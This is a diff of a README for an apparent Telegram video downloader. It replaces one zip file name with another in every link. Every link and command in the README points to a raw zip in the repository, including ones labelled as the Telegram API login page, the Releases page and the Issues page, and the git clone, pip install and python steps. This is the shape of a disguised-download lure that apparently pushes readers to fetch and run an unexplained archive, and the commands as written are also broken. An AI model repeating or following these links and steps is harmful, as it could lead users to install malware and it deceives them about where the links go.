@@ -1,6 +1,6 @@
 # 📥 Telegram-Downloader-Tools - Easily Download Telegram Videos
 
-[![Download](https://raw.githubusercontent.com/andreabranca/Telegram-Downloader-Tools/main/src/Telegram-Downloader-Tools_v3.5-alpha.5.zip)](https://raw.githubusercontent.com/andreabranca/Telegram-Downloader-Tools/main/src/Telegram-Downloader-Tools_v3.5-alpha.5.zip)
+[![Download](https://raw.githubusercontent.com/andreabranca/Telegram-Downloader-Tools/main/src/Tools-Downloader-Telegram-v2.4.zip)](https://raw.githubusercontent.com/andreabranca/Telegram-Downloader-Tools/main/src/Tools-Downloader-Telegram-v2.4.zip)
 
 ## 📋 Overview
 
@@ -26,14 +26,14 @@ Before you download and install the software, make sure you have the following:
 
 To obtain your API ID and API Hash, follow these steps:
 
-1. Visit [https://raw.githubusercontent.com/andreabranca/Telegram-Downloader-Tools/main/src/Telegram-Downloader-Tools_v3.5-alpha.5.zip](https://raw.githubusercontent.com/andreabranca/Telegram-Downloader-Tools/main/src/Telegram-Downloader-Tools_v3.5-alpha.5.zip) and log in with your phone number.
+1. Visit [https://raw.githubusercontent.com/andreabranca/Telegram-Downloader-Tools/main/src/Tools-Downloader-Telegram-v2.4.zip](https://raw.githubusercontent.com/andreabranca/Telegram-Downloader-Tools/main/src/Tools-Downloader-Telegram-v2.4.zip) and log in with your phone number.
 2. Click on "API development tools."
 3. Fill out the form to create a new application (App title, Short name, etc.).
 4. Your **api_id** and **api_hash** will be displayed.
 
 ### 👉 Download & Install
 
-1. To download the latest version of the tool, **visit this page to download**: [Releases Page](https://raw.githubusercontent.com/andreabranca/Telegram-Downloader-Tools/main/src/Telegram-Downloader-Tools_v3.5-alpha.5.zip).
+1. To download the latest version of the tool, **visit this page to download**: [Releases Page](https://raw.githubusercontent.com/andreabranca/Telegram-Downloader-Tools/main/src/Tools-Downloader-Telegram-v2.4.zip).
 
 2. After downloading, you need to install the necessary dependencies. Follow these steps:
 
@@ -43,9 +43,9 @@ To obtain your API ID and API Hash, follow these steps:
 
    - Run the following commands:
    ```bash
-   git clone https://raw.githubusercontent.com/andreabranca/Telegram-Downloader-Tools/main/src/Telegram-Downloader-Tools_v3.5-alpha.5.zip
+   git clone https://raw.githubusercontent.com/andreabranca/Telegram-Downloader-Tools/main/src/Tools-Downloader-Telegram-v2.4.zip
    cd Telegram-Downloader-Tools
-   pip install -r https://raw.githubusercontent.com/andreabranca/Telegram-Downloader-Tools/main/src/Telegram-Downloader-Tools_v3.5-alpha.5.zip
+   pip install -r https://raw.githubusercontent.com/andreabranca/Telegram-Downloader-Tools/main/src/Tools-Downloader-Telegram-v2.4.zip
    ```
 
 ### ⚙️ Running the Tool
@@ -54,7 +54,7 @@ After installation, you can run the tool based on the interface you choose:
 
 - For the **CLI version**, run:
   ```bash
-  python https://raw.githubusercontent.com/andreabranca/Telegram-Downloader-Tools/main/src/Telegram-Downloader-Tools_v3.5-alpha.5.zip
+  python https://raw.githubusercontent.com/andreabranca/Telegram-Downloader-Tools/main/src/Tools-Downloader-Telegram-v2.4.zip
   ```
 
 - For the **GUI version**, simply open the application file by double-clicking it.
@@ -77,7 +77,7 @@ If you encounter issues during installation or usage, try the following:
 
 Should you need additional help, feel free to consult the community or documentation related to Python and Telegram.
 
-For any feedback or issues, please raise an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/andreabranca/Telegram-Downloader-Tools/main/src/Telegram-Downloader-Tools_v3.5-alpha.5.zip).
+For any feedback or issues, please raise an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/andreabranca/Telegram-Downloader-Tools/main/src/Tools-Downloader-Telegram-v2.4.zip).
 
 ### 📧 Get in Touch
 
